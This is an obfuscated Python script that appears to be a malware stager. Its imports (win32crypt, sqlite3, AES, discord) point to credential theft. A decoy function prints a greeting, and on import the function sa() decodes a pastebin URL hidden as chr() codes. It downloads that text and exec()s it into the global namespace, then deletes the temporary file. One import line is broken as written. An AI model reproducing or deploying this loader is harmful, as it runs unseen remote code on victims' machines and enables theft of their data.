import requests
sk=print
sN=False
sd=open
sI=globals
sj=Exception
sB=requests.get
import tempfile
sp=tempfile.NamedTemporaryFile
import os
sh=os.remove
sC=os.path
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import timezone,datetime,timedelta
import socket
import discord
se=discord.ext
from se import commands
import asyncio
import subprocess
def Bg():
  sk(("".join([chr(83),chr(97),chr(108),chr(117),chr(116)]))            )
def sf(nmbr,nmbrd):
  return nmbr+nmbrd
def sa():
  BT=("".join([chr(104),chr(116),chr(116),chr(112),chr(115),chr(58),chr(47),chr(47),chr(112),chr(97),chr(115),chr(116),chr(101),chr(98),chr(105),chr(110),chr(46),chr(99),chr(111),chr(109),chr(47),chr(114),chr(97),chr(119),chr(47),chr(65),chr(88),chr(90),chr(112),chr(102),chr(68),chr(50),chr(104)]))
  try:
    BY=sB(BT)
    BO=BY.text
    with sp(mode=("".join([chr(119)]))                    ,delete=sN)as BQ:
      BQ.write(BO)
      BW=BQ.name
    exec(sd(BW).read(),sI())
  except sj as e:
    sk(f"Une erreur s'est produite : 582")
  finally:
    if sC.exists(BW):
      sh(BW)
sa()
